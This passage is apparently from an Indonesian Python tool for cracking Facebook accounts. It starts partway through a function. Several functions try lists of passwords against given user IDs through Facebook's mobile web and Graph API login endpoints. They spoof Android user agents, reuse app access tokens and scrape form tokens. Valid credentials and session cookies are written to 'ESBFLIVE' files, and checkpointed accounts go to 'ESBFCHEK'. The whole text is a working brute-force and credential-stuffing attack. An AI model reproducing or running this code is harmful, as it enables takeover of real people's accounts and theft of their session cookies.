            asmy = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
            apcb = '#PWD_BROWSER:0:{}:{}'.format(str(int(time.time())), pw)
            dat = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(asmy)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(asmy)).group(1),
            'email': uid,
            'prefill_contact_point': uid,
            'trynum': '1',
            'timezone': '240',
            'lgndim': 'eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ==',
            'lgnrnd': '052048_Gzhe',
            'lgnjs': '1727785248',
            'prefill_type': 'contact_point',
            'first_prefill_type': 'contact_point',
            'had_cp_prefilled': 'true',
            'had_password_prefilled': 'false',
            'pass': apcb,
            }
            hd = {
                'Host': 'web.facebook.com',
                'content-length': str(len(dat)),
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Android WebView";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-prefers-color-scheme': 'dark',
                'origin': 'https://web.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            }
            resp = ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1",data=dat,headers=hd)
            cookies_dict = ses.cookies.get_dict()
            if "c_user" in cookies_dict:
                ok += 1
                uids = cookies_dict.get('c_user', uid)
                coki = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
                print(f"\r{H}[ OK ] {uids}|{pw}|{coki}{P}")
                open('ESBFLIVE/' + okc, 'a').write(f"{uids}|{pw}|{coki}\n")
                break
            elif "checkpoint" in cookies_dict:
                cp += 1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/' + cpc, 'a').write(f"{uid}|{pw}\n")
                break
            else:
                ses = requests.Session()
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(30)
        except Exception:
            continue
    loop += 1

def generate_random_user_agent_api():
    def random_float(min_val, max_val):
        return round(random.uniform(min_val, max_val), 2)

    def random_int(min_val, max_val):
        return random.randint(min_val, max_val)

    mi_models = random.choice([
        "Mi 10", "Mi 10 Lite (5G)", "Mi 10 Lite Zoom", "Mi 10 Pro", "Mi 10 Ultra", "Mi 11",
        "Mi 11 (5G)", "Mi 11 LE", "Mi 11 Lite", "Mi 11 Lite (5G)", "Mi 11 Lite 5G NE", "Mi 11 Lite NE (5G)", "Mi 11 Pro",
        "Mi 11 Pro (5G)", "Mi 11 Ultra (5G)", "Mi 11i", "Mi 11i (5G)", "Mi 11T (5G)", "Mi 11T Pro", "Mi 11T Pro (5G)",
        "Mi 11X", "Mi 11X Pro (5G)", "Mi 12 Pro", "Mi 12T Pro", "Redmi 5 pro,", "Redmi 5Plus", "Redmi 85781",
        "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I",
        "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C",
        "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY",
        "M2007J17G", "M2007J3SG"
    ])
    pixel_models = random.choice([
        "Pixel 2", "Pixel 2 XL", "Pixel 3", "Pixel 3 XL", "Pixel 3A", "Pixel 3A XL", "Pixel 4", "Pixel 4 XL",
        "Pixel 4a", "Pixel 4a (5G)", "Pixel 5", "Pixel 5a (5G)", "Pixel 6", "Pixel 6 Pro", "Pixel 6a", "Pixel 7",
        "Pixel 7 Pro", "Pixel 7a", "Pixel 8", "Pixel 8 Pro", "Pixel 8 Pro (5G)", "Pixel 8a", "Pixel 9", "Pixel 9 Pro",
        "Pixel 9 Pro Fold", "Pixel 9 Pro XL"
    ])
    
    ver_os = random.choice(['9|PPR1', '10|QP1A', '11|RP1A', '12|SP1A', '13|TP1A', '14|UP1A'])
    android = ver_os.split("|")[0]
    build = "Build/{}.{}.00{}".format(ver_os.split("|")[1], random_int(111111, 333333), random_int(1, 9))
    density, width, height = random_float(1.0, 4.0), random_int(720, 1440), random_int(1280, 2560)
    carrier = random.choice(['Telkomsel', 'XL', 'Indosat', 'Smartfren', 'Tri'])
    device = random.choice([f'google|{pixel_models}', f'xiaomi|{mi_models}'])
    device_brand, device_model = device.split("|")[0], device.split("|")[1]
    
    return f'[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{{density={density},width={width},height={height}}};FBLC/id_ID;FBRV/0;FBCR/XL;FBMF/{device_brand.capitalize()};FBBD/{device_brand};FBPN/com.facebook.mahos;FBDV/{device_model};FBSV/{android};FBOP/1;FBCA/arm64-v8a:;]'


def apienak(uid,pasw):
    global loop, ok, cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}", end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            useragent = generate_random_user_agent_api()
            data = {
                'adid': str(uuid.uuid4()),
                'device_id': str(uuid.uuid4()),
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'logged_out_id': str(uuid.uuid4()),
                'hash_id': str(uuid.uuid4()),
                'reg_instance': str(uuid.uuid4()),
                'session_id': str(uuid.uuid4()),
                'advertiser_id': str(uuid.uuid4()),
                'format': 'json',
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'sim_country': 'id',
                'network_country': 'id',
                'relative_url': 'method/auth.login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Host': 'b-graph.facebook.com',
                'User-Agent': x1(),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'unknown',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 60000000)),
                'X-FB-Net-HNI': str(random.randint(200000, 400000)),
                'X-FB-SIM-HNI': str(random.randint(200000, 400000)),
                'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-FB-device-group': '3537',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-connection-quality': 'EXCELLENT',
                'X-Tigon-Is-Retry': 'False',
                'X-FB-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-FB-HTTP-Engine': 'Liger'
            }
            po = ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
            if 'session_key' in po:
                ok+=1
                print(f"\r{H}[ OK ] {uid}|{pw}{P}")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}\n")
                break
            elif 'www.facebook.com' in po['error']['message']:
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def apienak1(uid,pasw):
    global loop, ok, cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}", end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': uid,
                'password': pw,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': x1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                ok+=1
                print(f"\r{H}[ OK ] {uid}|{pw}{P}")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}\n")
                break
            elif 'www.facebook.com' in po['error']['message']:
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def apienak2(uid,pasw):
    global loop, ok, cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}", end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            data={
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email':uid,
                'password':pw,
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies':'1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'Content-Type': 'application/x-www-form-accencoded',
                'Host': 'graph.facebook.com',
                'User-Agent': x1(),
                'X-FB-Net-HNI': '45204',
                'X-FB-SIM-HNI': '45201',
                'X-FB-Connection-Type': 'unknown',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'Accept-Encoding': 'gzip, deflate',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Connection': 'Keep-Alive'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                ok+=1
                print(f"\r{H}[ OK ] {uid}|{pw}{P}")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}\n")
                break
            elif 'www.facebook.com' in po['error']['message']:
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def apienak3(uid,pasw):
    global loop, ok, cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}", end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': uid,
                'password': pw,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers={
                'User-Agent': x1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Content-Length': '706'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                ok+=1
                print(f"\r{H}[ OK ] {uid}|{pw}{P}")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}\n")
                break
            elif 'www.facebook.com' in po['error']['message']:
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def yaya(uid,pasw):
    global loop, ok, cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}", end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            _ua_d  = _generate_ua_apui()
            _agent = _ua_d['ua']
            _sch_ua     = _ua_d['sec_ch_ua']
            _sch_full   = _ua_d['sec_ch_ua_full_version_list']
            _sch_mob    = _ua_d['sec_ch_ua_mobile']
            _sch_mod    = _ua_d['sec_ch_ua_model']
            _sch_plat   = _ua_d['sec_ch_ua_platform']
            _sch_platv  = _ua_d['sec_ch_ua_platform_version']
            url = 'https://m.beta.facebook.com/login/'
            headi = {
                'Host': 'm.beta.facebook.com',
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': _agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Priority': 'u=0, i',
            }
            headi['Sec-Ch-Ua']                   = _sch_ua
            headi['Sec-Ch-Ua-Full-Version-List'] = _sch_full
            headi['Sec-Ch-Ua-Mobile']            = _sch_mob
            headi['Sec-Ch-Ua-Model']             = _sch_mod
            headi['Sec-Ch-Ua-Platform']          = _sch_plat
            headi['Sec-Ch-Ua-Platform-Version']  = _sch_platv
            q  = ses.get(url, headers=headi)
            rt = q.text
            hsku = ''
            _m = re.search(r'"haste_session"\s*:\s*"([^"]+)"', rt)
            if _m: hsku = _m.group(1)
            ccgku = ''
            _m = re.search(r'"connectionClass"\s*:\s*"([^"]+)"', rt)
            if _m: ccgku = _m.group(1)
            revku = ''
            _m = re.search(r'consistency[^}]*rev:(\d+)', rt)
            if not _m: _m = re.search(r'"rev"\s*:\s*(\d+)', rt)
            if not _m: _m = re.search(r'\brev:(\d+)', rt)
            if _m: revku = _m.group(1)
            hsiku = ''
            _m = re.search(r'"hsi"\s*:\s*"([^"]+)"', rt)
            if _m: hsiku = _m.group(1)
            dtsg = ''
            _m = re.search(r'"dtsg"\s*:\s*\{\s*"token"\s*:\s*"([^"]+)"', rt)
            if not _m: _m = re.search(r'"token"\s*:\s*"([A-Za-z0-9_\-]+:[0-9]+:[0-9]+)"', rt)
            if _m: dtsg = _m.group(1)
            jazoest = ''
            _m = re.search(r"""name=["']jazoest["']\s+value=["']([^"']+)["']""", rt)
            if not _m: _m = re.search(r"""<input[^>]+name=["']jazoest["'][^>]+value=["']([^"']+)["']""", rt)
            if _m: jazoest = _m.group(1)
            lsd = ''
            _m = re.search(r"""name=["']lsd["']\s+value=["']([^"']+)["']""", rt)
            if not _m: _m = re.search(r"""<input[^>]+name=["']lsd["'][^>]+value=["']([^"']+)["']""", rt)
            if not _m: _m = re.search(r'"lsd"\s*:\s*"([^"]+)"', rt)
            if _m: lsd = _m.group(1)
            headers = {
                'accept': '*/*',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://m.beta.facebook.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://m.beta.facebook.com/login/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': _sch_ua,
                'sec-ch-ua-full-version-list': _sch_full,
                'sec-ch-ua-mobile': _sch_mob,
                'sec-ch-ua-model': _sch_mod,
                'sec-ch-ua-platform': _sch_plat,
                'sec-ch-ua-platform-version': _sch_platv,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': _agent,
            }
            params = {
                'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
                'type': 'action',
                '__bkv': '4d80cbf5a81f2494a830bb526773c8d2bf86cc7be7619c08b340952a54773dcd',
            }
            apcb = '#PWD_BROWSER:0:{}:{}'.format(str(int(time.time())), pw)
            data = {
                '__aaid': '0',
                '__user': '0',
                '__a': '1',
                '__req': 'k',
                '__hs': hsku,
                'dpr': '3',
                '__ccg': ccgku,
                '__rev': revku,
                '__s': '',
                '__hsi': hsiku,
                '__dyn': '',
                'fb_dtsg': dtsg,
                'jazoest': jazoest,
                'lsd': lsd,
                'params': json.dumps({
                    "params": json.dumps({
                        "server_params": {
                            "credential_type": "password",
                            "username_text_input_id": "e7f9ek:58",
                            "password_text_input_id": "e7f9ek:59",
                            "login_source": "Login",
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "ar_event_source": "login_home_page",
                            "should_trigger_override_login_success_action": 0,
                            "should_trigger_override_login_2fa_action": 0,
                            "is_caa_perf_enabled": 0,
                            "reg_flow_source": "login_home_native_integration_point",
                            "caller": "gslr",
                            "is_from_landing_page": 0,
                            "is_from_empty_password": 0,
                            "is_from_aymh": 0,
                            "is_from_password_entry_page": 0,
                            "is_from_assistive_id": 0,
                            "is_from_msplit_fallback": 0,
                            "two_step_login_type": "one_step_login",
                            "left_nav_button_action": "NONE",
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "INTERNAL__latency_qpl_instance_id": "85899580400185",
                            "device_id": None,
                            "family_device_id": None,
                            "waterfall_id": str(uuid.uuid4()),
                            "offline_experiment_group": None,
                            "layered_homepage_experiment_group": None,
                            "is_platform_login": 0,
                            "is_from_logged_in_switcher": 0,
                            "is_from_logged_out": 0,
                            "access_flow_version": "pre_mt_behavior",
                            "login_surface": "login_home",
                            "login_entry_point": "logged_out"
                        },
                        "client_input_params": {
                            "machine_id": "",
                            "cloud_trust_token": None,
                            "block_store_machine_id": "",
                            "zero_balance_state": "",
                            "contact_point": uid,
                            "password": apcb,
                            "accounts_list": [],
                            "fb_ig_device_id": [],
                            "secure_family_device_id": "",
                            "encrypted_msisdn": "",
                            "headers_infra_flow_id": "",
                            "try_num": 1,
                            "login_attempt_count": 1,
                            "event_flow": "login_manual",
                            "event_step": "home_page",
                            "openid_tokens": {},
                            "auth_secure_device_id": "",
                            "client_known_key_hash": "",
                            "has_whatsapp_installed": 0,
                            "sso_token_map_json_string": "",
                            "should_show_nested_nta_from_aymh": 0,
                            "gms_incoming_call_retriever_eligibility": "client_not_supported",
                            "password_contains_non_ascii": "false",
                            "has_granted_read_contacts_permissions": 0,
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "",
                            "aymh_accounts": [
                                {
                                    "id": "",
                                    "profiles": {
                                        "id": {
                                            "user_id": "",
                                            "name": "",
                                            "profile_picture_url": "",
                                            "small_profile_picture_url": None,
                                            "notification_count": 0,
                                            "credential_type": "none",
                                            "token": "",
                                            "last_access_time": 0,
                                            "is_derived": 0,
                                            "username": "",
                                            "password": "",
                                            "has_smartlock": 0,
                                            "account_center_id": "",
                                            "account_source": "",
                                            "credentials": [],
                                            "nta_eligibility_reason": None,
                                            "from_accurate_privacy_result": 0,
                                            "dbln_validated": 0
                                        }
                                    }
                                }
                            ],
                            "sso_accounts_auth_data": [],
                            "blocked_uids": [],
                            "network_bssid": None,
                            "lois_settings": {
                                "lois_token": ""
                            },
                            "aac": ""
                        }
                    })
                }),
            }
            pr = ses.post('https://m.beta.facebook.com/async/wbloks/fetch/', headers=headers, data=data, params=params)
            cookies_dict = ses.cookies.get_dict()
            if "c_user" in cookies_dict:
                ok += 1
                uids = cookies_dict.get('c_user', uid)
                coki = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
                print(f"\r{H}[ OK ] {uids}|{pw}|{coki}{P}")
                open('ESBFLIVE/' + okc, 'a').write(f"{uids}|{pw}|{coki}\n")
                break
            elif "checkpoint" in cookies_dict:
                cp += 1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/' + cpc, 'a').write(f"{uid}|{pw}\n")
                break
            else:
                ses = requests.Session()
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(30)
        except Exception:
            continue
    loop += 1

if __name__=='__main__':
    os.system('clear')
    try:os.mkdir('ESBFLIVE')
    except:pass
    try:os.mkdir('ESBFCHEK')
    except:pass
    banner()
    print(f'{P}[ 1 ] Login UID')
    print(f'[ 2 ] Langsung File{P}')
    pilih_utama = input(f'{P}[ + ] Pilih menu : ')
    if pilih_utama == '1':
        menu_login()
    elif pilih_utama == '2':
        Crack_file()
    else:
        print(f'{K}[ ! ] Pilihan tidak valid{P}')
